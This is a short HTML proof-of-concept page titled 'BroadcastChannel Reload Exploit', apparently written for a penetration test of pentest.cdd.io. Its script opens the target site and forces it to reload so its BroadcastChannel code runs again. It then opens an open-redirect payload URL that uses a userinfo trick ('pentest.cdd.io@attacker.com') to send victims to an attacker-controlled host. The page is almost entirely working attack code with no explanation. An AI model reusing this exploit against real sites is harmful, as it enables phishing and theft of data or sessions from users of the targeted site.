<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>BroadcastChannel Reload Exploit</title>
</head>
<body>
  <h1>Click to Start Exploit</h1>
  <button onclick="runExploit()">Start</button>

  <script>
    function runExploit() {
      // Step 1: Open real site in a new tab
      const triggerTab = window.open("https://pentest.cdd.io/", "_blank");

      // Step 2: Wait a bit, then force reload to re-trigger BroadcastChannel
      setTimeout(() => {
        try {
          triggerTab.location.reload(); // Force re-run of DOM-ready scripts
        } catch (e) {
          console.error("Reload failed:", e);
        }
      }, 1500);

      // Step 3: Wait a bit more, then open redirect payload tab
      setTimeout(() => {
        window.open(
          "https://pentest.cdd.io/?redirect_url=https%3A%2F%2Fpentest.cdd.io%40attacker.com",
          "_blank"
        );
      }, 3000);
    }
  </script>
</body>
</html>
